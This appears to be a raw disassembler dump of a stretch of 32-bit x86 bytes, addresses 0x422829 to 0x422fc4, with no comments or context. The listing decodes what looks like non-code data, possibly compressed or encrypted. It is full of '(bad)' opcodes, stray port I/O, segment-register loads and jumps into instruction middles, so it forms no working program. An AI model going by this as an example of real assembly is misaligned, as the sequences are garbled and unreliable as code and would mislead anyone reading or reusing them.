  422829:	sbb    edi,DWORD PTR [edx+edi*2]
  42282c:	out    0xe7,al
  42282e:	sbb    al,0xad
  422830:	jle    0x422861
  422832:	imul   edx,DWORD PTR [ebp+0x53f4a0],0x0
  42283c:	add    BYTE PTR [eax],al
  42283e:	jo     0x422863
  422840:	and    eax,0x7c6f7769
  422845:	cmp    esp,DWORD PTR [eax+0x43bcee1c]
  42284b:	jp     0x422845
  42284d:	inc    ecx
  42284e:	leave  
  42284f:	rol    BYTE PTR [ecx],1
  422851:	add    BYTE PTR [ecx+0x0],ah
  422854:	add    BYTE PTR [eax],al
  422856:	push   ebx
  422857:	mov    al,0x58
  422859:	(bad)  
  42285a:	push   esi
  42285b:	pop    ds
  42285c:	or     bl,BYTE PTR [eax-0x3356155]
  422862:	and    cl,BYTE PTR [edx-0x7f]
  422865:	cld    
  422866:	fsub   st,st(2)
  422868:	or     edx,DWORD PTR [edi+ebx*8+0x40bd318a]
  42286f:	pushf  
  422870:	dec    edx
  422871:	adc    DWORD PTR [ebx+0x64deec6a],ecx
  422877:	(bad)  
  422879:	(bad)  
  42287b:	jecxz  0x42281d
  42287d:	xchg   edx,eax
  42287e:	aam    0x20
  422880:	loopne 0x422806
  422882:	add    eax,0xb968eaa8
  422887:	das    
  422888:	arpl   WORD PTR ds:0x90a77d91,cx
  42288e:	dec    edi
  42288f:	dec    esp
  422890:	fisttp WORD PTR [edx+0x17]
  422893:	test   eax,0xa2cb36b7
  422898:	not    esi
  42289a:	repnz mov al,ds:0xaa296f44
  4228a0:	mov    esp,0x1d88a7f3
  4228a5:	lods   al,BYTE PTR ds:[esi]
  4228a6:	xchg   edi,eax
  4228a7:	popf   
  4228a8:	les    esp,FWORD PTR [esi-0x79]
  4228ab:	adc    ebx,DWORD PTR cs:[edx+0x418439ee]
  4228b2:	in     eax,dx
  4228b3:	mov    edx,0xd3277
  4228b8:	add    BYTE PTR [eax],al
  4228ba:	add    BYTE PTR [eax],al
  4228bc:	add    BYTE PTR [eax],al
  4228be:	xchg   esp,eax
  4228bf:	nop
  4228c0:	ffree  st(0)
  4228c2:	(bad)  
  4228c4:	popf   
  4228c5:	aam    0x57
  4228c7:	(bad)
  4228cb:	add    al,dh
  4228cd:	dec    edi
  4228ce:	sub    dl,cl
  4228d0:	add    DWORD PTR [eax],eax
  4228d2:	popa   
  4228d3:	add    BYTE PTR [eax],al
  4228d5:	add    BYTE PTR [eax-0x33c9e9bf],ah
  4228db:	out    0x5e,eax
  4228dd:	push   eax
  4228de:	outs   dx,BYTE PTR ds:[esi]
  4228df:	pusha  
  4228e0:	pop    eax
  4228e1:	or     DWORD PTR [ebp-0xc],esp
  4228e4:	arpl   dx,sp
  4228e6:	out    0x17,al
  4228e8:	push   ss
  4228e9:	xchg   esi,eax
  4228ea:	sub    al,0x21
  4228ec:	xchg   edi,eax
  4228ed:	scas   eax,DWORD PTR es:[edi]
  4228ee:	push   0x47
  4228f0:	out    dx,eax
  4228f1:	gs jne 0x4228e3
  4228f4:	lods   al,BYTE PTR ds:[esi]
  4228f5:	cmp    cl,ch
  4228f7:	rol    BYTE PTR [edx+0x3433862b],1
  4228fd:	sbb    eax,0xe3590ed7
  422902:	(bad)  
  422904:	sub    bl,BYTE PTR [edx]
  422906:	in     eax,dx
  422907:	jnp    0x422893
  422909:	aam    0xca
  42290b:	add    al,0x83
  42290d:	pop    es
  42290e:	fidiv  DWORD PTR [edx-0x5e]
  422911:	outs   dx,DWORD PTR ds:[esi]
  422912:	xor    eax,0xf04fe9b3
  422917:	mov    edi,0xc886306f
  42291c:	test   BYTE PTR ds:0x37a9a173,bl
  422922:	outs   dx,DWORD PTR ds:[esi]
  422923:	in     eax,dx
  422924:	ret    0x201f
  422927:	cs mov esp,0xbe773169
  42292d:	jo     0x422959
  42292f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422930:	in     eax,0xf9
  422932:	and    ch,ch
  422934:	das    
  422935:	push   esp
  422936:	xlat   BYTE PTR ds:[ebx]
  422937:	add    BYTE PTR [eax],al
  422939:	add    BYTE PTR [eax],al
  42293b:	add    BYTE PTR [eax],al
  42293d:	add    ah,dh
  42293f:	mov    dl,0x32
  422941:	(bad)  
  422942:	jbe    0x42291a
  422944:	hlt    
  422945:	mov    dl,0xb1
  422947:	and    al,0xfe
  422949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42294a:	adc    eax,0x8b228e05
  42294f:	rol    DWORD PTR [ecx],1
  422951:	add    BYTE PTR [ecx+0x0],ah
  422954:	add    BYTE PTR [eax],al
  422956:	jecxz  0x42297e
  422958:	dec    esp
  422959:	pop    esp
  42295a:	xor    dl,bl
  42295c:	nop
  42295d:	sbb    DWORD PTR [edx+esi*2+0x51],esi
  422961:	mov    eax,es:0xd223004a
  422967:	sbb    DWORD PTR [edx+edx*1],0x293ce5aa
  42296e:	dec    ebx
  42296f:	jge    0x4229cb
  422971:	mov    ss,esi
  422973:	ror    dl,0xea
  422976:	inc    eax
  422977:	cmp    DWORD PTR [ecx],edx
  422979:	jb     0x42290c
  42297b:	jmp    0x4229b7
  42297d:	leave  
  42297e:	pop    edx
  42297f:	cmc    
  422980:	sahf   
  422981:	int3   
  422982:	rcr    BYTE PTR [edx],cl
  422984:	arpl   WORD PTR [ecx+0x6c875f84],di
  42298a:	dec    ebp
  42298b:	add    DWORD PTR [ebp-0x42],0x79
  42298f:	or     eax,0xc2c5547e
  422994:	jmp    0x4229fe
  422996:	dec    ebx
  422997:	pop    ebx
  422998:	dec    edx
  422999:	test   eax,0xbab630a6
  42299e:	loope  0x422977
  4229a0:	popa   
  4229a1:	ror    ecx,cl
  4229a3:	call   0x1fc6a8b3
  4229a8:	enter  0x239a,0xd7
  4229ac:	adc    eax,0x1251ced7
  4229b1:	fistp  QWORD PTR [eax]
  4229b3:	popf   
  4229b4:	or     BYTE PTR [edi+edi*1],0x0
  4229b8:	add    BYTE PTR [eax],al
  4229ba:	add    BYTE PTR [eax],al
  4229bc:	add    BYTE PTR [eax],al
  4229be:	xor    dl,bl
  4229c0:	into   
  4229c1:	mov    ds:0xd37ebfef,al
  4229c6:	sub    edi,DWORD PTR [esi]
  4229c8:	out    0x3f,eax
  4229ca:	xchg   ecx,eax
  4229cb:	push   ds
  4229cc:	add    al,0x57
  4229ce:	in     al,dx
  4229cf:	rol    DWORD PTR [ecx],1
  4229d1:	add    BYTE PTR [ecx+0x0],ah
  4229d4:	add    BYTE PTR [eax],al
  4229d6:	mov    WORD PTR [edi+edx*2],ds
  4229d9:	into   
  4229da:	aaa    
  4229db:	or     al,BYTE PTR [ebx+esi*2+0x2a2f132b]
  4229e2:	dec    ebp
  4229e3:	dec    ecx
  4229e4:	mov    esp,0x85366366
  4229e9:	inc    esp
  4229ea:	idiv   DWORD PTR [edi-0x3b]
  4229ed:	push   esi
  4229ee:	jge    0x4229e1
  4229f0:	lods   eax,DWORD PTR ds:[esi]
  4229f1:	or     al,0x6d
  4229f3:	jle    0x4229a6
  4229f5:	dec    sp
  4229f7:	xchg   edi,eax
  4229f8:	push   edi
  4229f9:	dec    ebx
  4229fa:	stos   BYTE PTR es:[edi],al
  4229fb:	fs clc 
  4229fd:	mov    ch,BYTE PTR [edi+0x7d]
  422a00:	vpackssdw xmm5,xmm4,XMMWORD PTR [esi+ecx*8-0xcbed6a5]
  422a09:	mov    esi,edx
  422a0b:	pop    esi
  422a0c:	or     BYTE PTR [ebx-0x7aefc33],bh
  422a12:	enter  0x7be7,0x91
  422a16:	mov    ah,0xa6
  422a18:	mov    edx,0x3d9d9367
  422a1d:	inc    BYTE PTR [edi]
  422a1f:	popa   
  422a20:	dec    esp
  422a21:	shr    DWORD PTR fs:[eax+0x78e54e31],1
  422a28:	mov    eax,0xb872d7c6
  422a2d:	lods   eax,DWORD PTR ds:[esi]
  422a2e:	xchg   ecx,eax
  422a2f:	rcl    DWORD PTR [edi],1
  422a31:	mov    DWORD PTR [eax+0x50],0x910c6a
  422a38:	add    BYTE PTR [eax],al
  422a3a:	add    BYTE PTR [eax],al
  422a3c:	add    BYTE PTR [eax],al
  422a3e:	fucomi st,st(5)
  422a40:	outs   dx,BYTE PTR ds:[esi]
  422a41:	and    bh,BYTE PTR [esi-0x5d]
  422a44:	(bad)  
  422a46:	pop    esi
  422a47:	(bad)  
  422a48:	mov    DWORD PTR [ebp-0x668738ae],ecx
  422a4e:	dec    ebp
  422a4f:	rol    BYTE PTR [ecx],cl
  422a51:	add    BYTE PTR [ecx+0x0],ah
  422a54:	add    BYTE PTR [eax],al
  422a56:	test   ah,dl
  422a58:	push   0xffffffc4
  422a5a:	or     al,0x5b
  422a5c:	jns    0x422a0c
  422a5e:	dec    eax
  422a5f:	xlat   BYTE PTR ds:[ebx]
  422a60:	std    
  422a61:	fisttp WORD PTR [edi-0x59]
  422a64:	sbb    DWORD PTR [edx-0x41],edi
  422a67:	mov    edi,0xbf56a551
  422a6c:	pushf  
  422a6d:	jle    0x422aec
  422a6f:	ds aaa 
  422a71:	add    ecx,DWORD PTR [ecx+eiz*4-0x44]
  422a75:	lahf   
  422a76:	jbe    0x422a12
  422a78:	mov    eax,ds:0x3d4ca3f4
  422a7d:	out    0x75,al
  422a7f:	mov    esp,DWORD PTR [ebp+edi*2+0x13]
  422a83:	addr16 addr16 adc al,0xfa
  422a87:	jnp    0x422ac4
  422a89:	shl    BYTE PTR [ebx+eax*2],1
  422a8c:	sbb    al,0xa3
  422a8e:	cmp    BYTE PTR [eax],ah
  422a90:	cwde   
  422a91:	add    edx,ecx
  422a93:	or     esi,0x8
  422a96:	xchg   edx,eax
  422a97:	dec    eax
  422a98:	test   DWORD PTR [ebx-0x1d],eax
  422a9b:	mov    ds:0xac253a47,al
  422aa0:	xchg   ch,cl
  422aa2:	loopne 0x422ae0
  422aa4:	clc    
  422aa5:	lds    edx,FWORD PTR [esi]
  422aa7:	les    edi,FWORD PTR [ecx-0x5b]
  422aaa:	xor    DWORD PTR [edx-0x1a],eax
  422aad:	inc    eax
  422aae:	dec    edi
  422aaf:	cmp    DWORD PTR [ecx+eiz*4],edx
  422ab2:	pop    ecx
  422ab3:	pop    ss
  422ab4:	pusha  
  422ab5:	dec    eax
  422ab6:	lods   al,BYTE PTR ds:[esi]
  422ab7:	add    BYTE PTR [eax],al
  422ab9:	add    BYTE PTR [eax],al
  422abb:	add    BYTE PTR [eax],al
  422abd:	add    BYTE PTR ds:0x6f976b22,al
  422ac3:	(bad)  
  422ac5:	mov    dl,0x66
  422ac7:	and    BYTE PTR [esi+0x3016b56a],ah
  422acd:	inc    ecx
  422ace:	scas   al,BYTE PTR es:[edi]
  422acf:	rol    BYTE PTR [ecx],cl
  422ad1:	add    BYTE PTR [ecx+0x0],ah
  422ad4:	add    BYTE PTR [eax],al
  422ad6:	aad    0x24
  422ad8:	pop    ebx
  422ad9:	cmp    dh,bl
  422adb:	imul   edx,DWORD PTR [ebx],0xfce830ac
  422ae1:	pop    ss
  422ae2:	enter  0x89d0,0xf5
  422ae6:	loope  0x422b52
  422ae8:	arpl   dx,ax
  422aea:	clc    
  422aeb:	mov    esi,DWORD PTR [ecx+ebp*8]
  422aee:	(bad)  
  422aef:	mov    ds:0xea6d4027,eax
  422af4:	in     al,dx
  422af5:	retf   
  422af6:	add    DWORD PTR [edi],ecx
  422af8:	cmp    DWORD PTR [bx+0x6507],esp
  422afd:	ret    0x96a3
  422b00:	cmc    
  422b01:	inc    edx
  422b02:	or     DWORD PTR es:[eax+0x25ee525e],ebx
  422b09:	fsubr  st,st(5)
  422b0b:	xchg   esp,eax
  422b0c:	sbb    BYTE PTR [ecx-0x51c0a642],dh
  422b12:	lock adc eax,0x1b0d51b5
  422b18:	mov    ebx,0xeabb864c
  422b1d:	test   BYTE PTR [edi-0x1b8aea2e],ch
  422b23:	inc    esi
  422b24:	jno    0x422b35
  422b26:	retf   0x9988
  422b29:	in     al,0x74
  422b2b:	imul   esi,ecx,0x803973e7
  422b31:	jecxz  0x422ada
  422b33:	and    bh,BYTE PTR [esp+esi*8-0x46]
  422b37:	add    BYTE PTR [eax],al
  422b39:	add    BYTE PTR [eax],al
  422b3b:	add    BYTE PTR [eax],al
  422b3d:	add    BYTE PTR [ebx+0x7fd924d4],cl
  422b43:	stc    
  422b44:	call   esi
  422b46:	into   
  422b47:	inc    ebp
  422b48:	mov    bh,0x11
  422b4a:	mov    ebx,0xf5d3de2
  422b4f:	rol    DWORD PTR [ecx],cl
  422b51:	add    BYTE PTR [ecx+0x0],ah
  422b54:	add    BYTE PTR [eax],al
  422b56:	add    DWORD PTR [esi+0x50fd1c1b],esi
  422b5c:	nop
  422b5d:	dec    eax
  422b5e:	shl    DWORD PTR [edi-0x76],cl
  422b61:	int    0x46
  422b63:	daa    
  422b64:	sbb    edi,DWORD PTR [edi+0x41]
  422b67:	pop    edx
  422b68:	out    0x33,al
  422b6a:	jge    0x422b8e
  422b6c:	dec    edi
  422b6d:	mov    bl,0x9d
  422b6f:	(bad)  
  422b70:	in     al,dx
  422b71:	icebp  
  422b72:	mov    al,0x9c
  422b74:	in     al,0xe7
  422b76:	fnstenv [ebp+0x9]
  422b79:	dec    ecx
  422b7a:	and    ecx,DWORD PTR [ecx+0x23]
  422b7d:	pusha  
  422b7e:	jns    0x422b17
  422b80:	add    eax,0xdaf32e27
  422b85:	in     al,0x88
  422b87:	add    eax,0x412ecb33
  422b8c:	jns    0x422bac
  422b8e:	(bad)
  422b91:	mov    ah,0x37
  422b93:	das    
  422b94:	jl     0x422b9d
  422b96:	inc    edi
  422b97:	mov    dh,0x38
  422b99:	jb     0x422b6a
  422b9b:	outs   dx,DWORD PTR ds:[esi]
  422b9c:	mov    ecx,DWORD PTR [ecx-0x32ff694e]
  422ba2:	jno    0x422b90
  422ba4:	aas    
  422ba5:	rol    BYTE PTR [edi-0x2f],0x79
  422ba9:	sahf   
  422baa:	bound  ebx,QWORD PTR [edi-0x68ab22d3]
  422bb0:	jge    0x422b53
  422bb2:	pop    ecx
  422bb3:	add    DWORD PTR [esi+0xf371],ecx
  422bb9:	add    BYTE PTR [eax],al
  422bbb:	add    BYTE PTR [eax],al
  422bbd:	add    dh,bl
  422bbf:	sub    DWORD PTR [eax-0x210c002e],ebx
  422bc5:	sub    eax,0x4af35f6
  422bca:	or     al,0xcc
  422bcc:	adc    eax,DWORD PTR [edx+0x1d370]
  422bd2:	popa   
  422bd3:	add    BYTE PTR [eax],al
  422bd5:	add    dl,dl
  422bd7:	xor    BYTE PTR [edx+ecx*4],dl
  422bda:	push   esp
  422bdb:	dec    esp
  422bdc:	jp     0x422c51
  422bde:	push   ss
  422bdf:	and    al,0xef
  422be1:	mov    al,ds:0x92bc49f5
  422be6:	adc    eax,0x9eac76d2
  422beb:	pop    es
  422bec:	mov    al,BYTE PTR [esi]
  422bee:	sub    ch,BYTE PTR [edx]
  422bf0:	add    al,0x0
  422bf2:	inc    eax
  422bf3:	fist   DWORD PTR [ebx+0x65fdb750]
  422bf9:	push   ecx
  422bfa:	(bad)  
  422bfb:	jmp    ebp
  422bfd:	out    0xec,eax
  422bff:	add    DWORD PTR [esp+eax*2-0x45],eax
  422c03:	jmp    0x422c7b
  422c05:	push   es
  422c06:	ins    DWORD PTR es:[edi],dx
  422c07:	mov    ecx,0x8a9dc2ef
  422c0c:	or     al,0x5a
  422c0e:	xor    ch,cl
  422c10:	pop    edi
  422c11:	loope  0x422c65
  422c13:	neg    DWORD PTR [esi+eiz*1]
  422c16:	pop    ecx
  422c17:	lahf   
  422c18:	add    BYTE PTR [ebp+0x7e],dh
  422c1b:	mov    ch,0x9c
  422c1d:	inc    edi
  422c1e:	ret    0x8333
  422c21:	or     ebp,esi
  422c23:	xor    esp,edi
  422c25:	pushf  
  422c26:	cmp    ecx,DWORD PTR [edx+edi*2-0x70136e77]
  422c2d:	inc    esp
  422c2e:	jge    0x422c46
  422c30:	out    0xa0,eax
  422c32:	inc    esi
  422c33:	xor    DWORD PTR [edi],edx
  422c35:	aad    0xf7
  422c37:	add    BYTE PTR [eax],al
  422c39:	add    BYTE PTR [eax],al
  422c3b:	add    BYTE PTR [eax],al
  422c3d:	add    BYTE PTR [esi+0x3f],cl
  422c40:	int3   
  422c41:	sbb    eax,0x7fdffffd
  422c46:	out    dx,eax
  422c47:	loopne 0x422c5f
  422c49:	lods   al,BYTE PTR ds:[esi]
  422c4a:	inc    ecx
  422c4b:	cmp    al,0x81
  422c4d:	inc    esp
  422c4e:	rcl    ebx,1
  422c50:	add    DWORD PTR [eax],eax
  422c52:	popa   
  422c53:	add    BYTE PTR [eax],al
  422c55:	add    dl,ch
  422c57:	mov    gs,ebx
  422c59:	pop    ebx
  422c5a:	pop    esp
  422c5b:	mov    dh,0x65
  422c5d:	add    eax,0x3226700a
  422c62:	(bad)  
  422c63:	lahf   
  422c64:	(bad)  
  422c66:	mov    ch,0x8
  422c68:	jb     0x422bff
  422c6a:	or     ebp,DWORD PTR [ebp+0x68ae5c81]
  422c70:	and    BYTE PTR es:[ebx-0xe],0xfe
  422c75:	xor    BYTE PTR [edx-0xc7df6f6],ah
  422c7b:	test   al,0x63
  422c7d:	loope  0x422c26
  422c7f:	or     al,0x98
  422c81:	xchg   edi,eax
  422c82:	sub    esi,ebx
  422c84:	lods   eax,DWORD PTR ds:[esi]
  422c85:	fld    DWORD PTR [ecx-0x19072308]
  422c8b:	push   0x65
  422c8d:	js     0x422cb0
  422c8f:	sub    eax,0x6275bf3e
  422c94:	(bad)  [eax+0x6f]
  422c97:	xor    BYTE PTR [ecx+0x4f],dl
  422c9a:	mov    edx,0x34a02611
  422c9f:	adc    BYTE PTR [edi],ah
  422ca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ca2:	sub    cl,ah
  422ca4:	sbb    eax,0x597a6485
  422ca9:	adc    ecx,ebp
  422cab:	cmp    BYTE PTR [eax-0x30f7cbb9],dh
  422cb1:	test   eax,0xd865b643
  422cb6:	int3   
  422cb7:	add    BYTE PTR [eax],al
  422cb9:	add    BYTE PTR [eax],al
  422cbb:	add    BYTE PTR [eax],al
  422cbd:	add    BYTE PTR [esi],bl
  422cbf:	test   eax,0x7ff735f6
  422cc4:	fild   QWORD PTR [ebx-0x5f9ed871]
  422cca:	xor    al,0x9f
  422ccc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ccd:	or     al,0x32
  422ccf:	aam    0x1
  422cd1:	add    BYTE PTR [ecx+0x0],ah
  422cd4:	add    BYTE PTR [eax],al
  422cd6:	mov    cl,0x76
  422cd8:	pushf  
  422cd9:	xchg   ebp,eax
  422cda:	test   eax,0x299a1969
  422cdf:	arpl   WORD PTR [esp+eax*8-0x1092a6e9],cx
  422ce6:	pop    ss
  422ce7:	mov    ?,edx
  422ce9:	into   
  422cea:	int    0xfb
  422cec:	push   eax
  422ced:	dec    ebp
  422cee:	popa   
  422cef:	sub    eax,0xdd71d714
  422cf4:	xchg   DWORD PTR ds:[ebp-0x6f],esp
  422cf8:	pop    edi
  422cf9:	dec    edx
  422cfa:	push   0xf4384cde
  422cff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d00:	scas   al,BYTE PTR es:[edi]
  422d01:	adc    eax,0x1cc5a6de
  422d06:	in     eax,0x4a
  422d08:	(bad)  
  422d09:	mov    eax,ds:0xc3015921
  422d0e:	fidiv  DWORD PTR [esp+ecx*4]
  422d11:	gs sub esi,esi
  422d14:	fistp  QWORD PTR [ebp-0x8]
  422d17:	cli    
  422d18:	mov    al,ds:0x7565b34d
  422d1d:	jl     0x422d2e
  422d1f:	in     al,dx
  422d20:	(bad)  
  422d21:	(bad)  
  422d23:	or     eax,0x4c6fab5d
  422d28:	fwait
  422d29:	lea    esi,[esi-0x7f0333c0]
  422d2f:	add    DWORD PTR [esi-0x28],esp
  422d32:	xchg   edx,eax
  422d33:	jo     0x422d81
  422d35:	aas    
  422d36:	daa    
  422d37:	add    BYTE PTR [eax],al
  422d39:	add    BYTE PTR [eax],al
  422d3b:	add    BYTE PTR [eax],al
  422d3d:	add    BYTE PTR [ebx+0x7f2d6de1],bl
  422d43:	lods   eax,DWORD PTR ds:[esi]
  422d44:	fcomi  st,st(7)
  422d46:	sar    BYTE PTR [ebx],cl
  422d48:	(bad)  
  422d49:	add    BYTE PTR [edx-0x68],al
  422d4c:	or     DWORD PTR [ebx-0x6d],ebp
  422d4f:	aam    0x1
  422d51:	add    BYTE PTR [ecx+0x0],ah
  422d54:	add    BYTE PTR [eax],al
  422d56:	jne    0x422d56
  422d58:	jle    0x422d9b
  422d5a:	adc    DWORD PTR [edi+ebx*2+0x7f],0x860e1268
  422d62:	lock sar DWORD PTR gs:[edx-0x6],1
  422d67:	(bad)  
  422d68:	loopne 0x422d44
  422d6a:	leave  
  422d6b:	adc    dl,al
  422d6d:	mov    al,ds:0xc1518142
  422d72:	mov    ah,0xdc
  422d74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d75:	sbb    BYTE PTR ss:[ebx+0x68],dl
  422d79:	pop    es
  422d7a:	dec    ebx
  422d7b:	mov    dl,0x28
  422d7d:	and    eax,0xaa19796
  422d82:	stc    
  422d83:	sub    al,0x9d
  422d85:	xchg   ecx,eax
  422d86:	nop
  422d87:	mov    edx,0xe62edf37
  422d8c:	xchg   ebx,eax
  422d8d:	pushf  
  422d8e:	pop    edx
  422d8f:	mov    eax,0x4ecf86ed
  422d94:	mov    ecx,0x594f934a
  422d99:	leave  
  422d9a:	pop    ebp
  422d9b:	cmp    al,0x70
  422d9d:	retf   0x739c
  422da0:	push   esi
  422da1:	cmp    esp,DWORD PTR [ebx-0x5b]
  422da4:	mov    bl,0x37
  422da6:	inc    esi
  422da7:	dec    ebx
  422da8:	and    DWORD PTR ds:0xc8907e85,edx
  422dae:	or     ch,BYTE PTR [ebx+0x29260e08]
  422db4:	jmp    0x42eee1
  422db9:	add    BYTE PTR [eax],al
  422dbb:	add    BYTE PTR [eax],al
  422dbd:	add    BYTE PTR [eax],cl
  422dbf:	div    DWORD PTR [edi+0x4a]
  422dc2:	dec    edx
  422dc4:	cmp    eax,0x2e8eedf7
  422dc9:	dec    eax
  422dca:	sahf   
  422dcb:	mov    ch,0x6
  422dcd:	and    eax,0x1d4f4
  422dd2:	popa   
  422dd3:	add    BYTE PTR [eax],al
  422dd5:	add    BYTE PTR [esi],ch
  422dd7:	dec    edi
  422dd8:	adc    eax,0x9d502bea
  422ddd:	out    dx,al
  422dde:	jne    0x422e53
  422de0:	xchg   edx,eax
  422de1:	sub    eax,0xb421904f
  422de6:	push   cs
  422de7:	dec    eax
  422de8:	pop    ss
  422de9:	xor    eax,0xd1bc4005
  422dee:	adc    bh,al
  422df0:	push   edx
  422df1:	js     0x422d99
  422df3:	add    dh,cl
  422df5:	pop    ebx
  422df6:	pop    edi
  422df7:	std    
  422df8:	aam    0xc2
  422dfa:	or     DWORD PTR [edi+ebx*1-0x43],ebp
  422dfe:	push   ebx
  422dff:	sub    bh,cl
  422e01:	inc    ebx
  422e02:	shl    BYTE PTR [ebx],0x99
  422e05:	mov    al,0x97
  422e07:	pop    esi
  422e08:	cmp    al,0xad
  422e0a:	xchg   edi,eax
  422e0b:	mov    BYTE PTR ds:0x72d6864a,ah
  422e11:	and    al,0x9e
  422e13:	rcr    ecx,1
  422e15:	pop    edi
  422e16:	sbb    ebx,DWORD PTR [edi-0x7c]
  422e19:	inc    esi
  422e1a:	gs or  eax,0x4a8c315d
  422e20:	(bad)  
  422e21:	xchg   esi,eax
  422e22:	daa    
  422e23:	mov    al,ds:0x96738435
  422e28:	js     0x422e3d
  422e2a:	cmp    eax,0x299b6caa
  422e2f:	(bad)  
  422e30:	shl    BYTE PTR ds:0x98502f21,cl
  422e36:	mov    es,WORD PTR [eax]
  422e38:	add    BYTE PTR [eax],al
  422e3a:	add    BYTE PTR [eax],al
  422e3c:	add    BYTE PTR [eax],al
  422e3e:	arpl   WORD PTR ss:[eax-0x10],bp
  422e42:	jge    0x422e3f
  422e44:	mov    esi,0x8c7853e7
  422e49:	daa    
  422e4a:	test   eax,0x550dc26c
  422e4f:	aad    0x1
  422e51:	add    BYTE PTR [ecx+0x0],ah
  422e54:	add    BYTE PTR [eax],al
  422e56:	enter  0x4c54,0xc7
  422e5a:	adc    DWORD PTR [ebx],0xcc03bb20
  422e60:	sbb    BYTE PTR [eax+ebp*8+0x73],0xa2
  422e65:	dec    ebx
  422e66:	fstp   TBYTE PTR [ebx]
  422e68:	cld    
  422e69:	test   DWORD PTR [esi],0x6cd5d1b7
  422e6f:	mov    dh,0x6f
  422e71:	and    DWORD PTR [edi],eax
  422e73:	into   
  422e74:	(bad)  
  422e75:	push   edi
  422e76:	shl    DWORD PTR [ebx],1
  422e78:	cmp    BYTE PTR [esi+0x5c],bl
  422e7b:	xchg   DWORD PTR [edx],eax
  422e7d:	sbb    BYTE PTR ds:0x72ed623a,0xe3
  422e84:	imul   edx,DWORD PTR [esi-0x6c2ca045],0x76e0ca76
  422e8e:	daa    
  422e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e90:	adc    DWORD PTR [ebp-0x274bc7fa],edx
  422e96:	xor    DWORD PTR [eax+0x76edb988],ebx
  422e9c:	mov    ebx,0x679b3c0a
  422ea1:	push   ss
  422ea2:	xchg   ebx,ecx
  422ea4:	or     eax,0x5317d8a9
  422ea9:	repnz dec ecx
  422eab:	pop    esi
  422eac:	sti    
  422ead:	fwait
  422eae:	je     0x422f22
  422eb0:	call   0xd53:0x63129726
  422eb7:	add    BYTE PTR [eax],al
  422eb9:	add    BYTE PTR [eax],al
  422ebb:	add    BYTE PTR [eax],al
  422ebd:	add    BYTE PTR [edi],ah
  422ebf:	push   ecx
  422ec0:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  422eca:	jno    0x422f1d
  422ecc:	sub    ch,BYTE PTR [edi]
  422ece:	mov    ah,bl
  422ed0:	add    DWORD PTR [eax],eax
  422ed2:	popa   
  422ed3:	add    BYTE PTR [eax],al
  422ed5:	add    dl,ch
  422ed7:	jp     0x422ea7
  422ed9:	dec    edx
  422eda:	jo     0x422eee
  422edc:	push   ds
  422edd:	fadd   QWORD PTR [edx+0x35fec87e]
  422ee3:	fldcw  WORD PTR [edx]
  422ee5:	push   ebx
  422ee6:	push   ecx
  422ee7:	inc    ebp
  422ee8:	das    
  422ee9:	je     0x422f51
  422eeb:	push   cs
  422eec:	and    eax,0xe0fe16b9
  422ef1:	fidivr DWORD PTR [ecx+0x46]
  422ef4:	inc    edx
  422ef5:	adc    BYTE PTR ds:0x8b641d99,bh
  422efb:	xor    al,0xca
  422efd:	mov    ds:0xb2685e48,al
  422f02:	push   ss
  422f03:	ror    DWORD PTR [ebx+0x364c5a85],cl
  422f09:	pushf  
  422f0a:	xchg   edi,eax
  422f0b:	ins    BYTE PTR es:[edi],dx
  422f0c:	xor    eax,DWORD PTR [edx-0x6b5bb83c]
  422f12:	loopne 0x422f75
  422f14:	rcl    BYTE PTR [edx-0x47],1
  422f17:	(bad)  
  422f18:	xchg   esi,eax
  422f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f1a:	je     0x422ecb
  422f1c:	mov    ah,0x7d
  422f1e:	dec    ecx
  422f1f:	and    DWORD PTR [ecx+0x3b],esi
  422f22:	shl    BYTE PTR [eax-0x4c23416],1
  422f28:	dec    esp
  422f29:	lock fild DWORD PTR [edi]
  422f2c:	mov    esp,0xefe5c288
  422f31:	push   esp
  422f32:	dec    ebp
  422f33:	inc    edi
  422f34:	push   eax
  422f35:	adc    dh,BYTE PTR [esi+0x0]
  422f38:	add    BYTE PTR [eax],al
  422f3a:	add    BYTE PTR [eax],al
  422f3c:	add    BYTE PTR [eax],al
  422f3e:	daa    
  422f3f:	ss lahf 
  422f41:	xor    DWORD PTR [edi+0x1536afb9],ebx
  422f47:	and    eax,0xca6e075b
  422f4c:	out    0x13,eax
  422f4e:	jmp    0x6142312f
  422f53:	add    BYTE PTR [eax],al
  422f55:	add    BYTE PTR [eax-0x20ad2ba9],al
  422f5b:	retf   0x8e24
  422f5e:	adc    eax,0x39e2dbab
  422f63:	jbe    0x422fca
  422f65:	mov    ecx,0xeae18ed4
  422f6a:	or     eax,0x2dc725a3
  422f6f:	scas   ax,WORD PTR es:[edi]
  422f71:	test   al,0xa5
  422f73:	jl     0x422f1a
  422f75:	xor    esp,DWORD PTR [eax+0x7f]
  422f78:	sub    eax,0xc85adbb8
  422f7d:	push   es
  422f7e:	mov    edx,0xe02b0a00
  422f83:	mov    al,0x3f
  422f85:	and    bl,BYTE PTR [edx-0x66582649]
  422f8b:	xlat   BYTE PTR ds:[ebx]
  422f8c:	ja     0x42300c
  422f8e:	dec    esp
  422f8f:	mov    dl,0xca
  422f91:	mov    BYTE PTR [edx-0xe],al
  422f94:	iret   
  422f95:	xchg   esp,eax
  422f96:	pop    ebp
  422f97:	mov    ?,esi
  422f99:	das    
  422f9a:	jb     0x422ff1
  422f9c:	mov    ecx,0xee7d954c
  422fa1:	mov    ss:0xcc114a98,al
  422fa7:	outs   dx,BYTE PTR ds:[esi]
  422fa8:	pop    ds
  422fa9:	clc    
  422faa:	fidivr DWORD PTR [ebx+0x71]
  422fad:	sub    ah,BYTE PTR [ecx-0x15e53c64]
  422fb3:	jl     0x422f4b
  422fb5:	popf   
  422fb6:	mov    DWORD PTR [eax],eax
  422fb8:	add    BYTE PTR [eax],al
  422fba:	add    BYTE PTR [eax],al
  422fbc:	add    BYTE PTR [eax],al
  422fbe:	aaa    
  422fbf:	(bad)  
  422fc0:	out    0xc2,eax
  422fc2:	mul    ebx
  422fc4:	aaa    
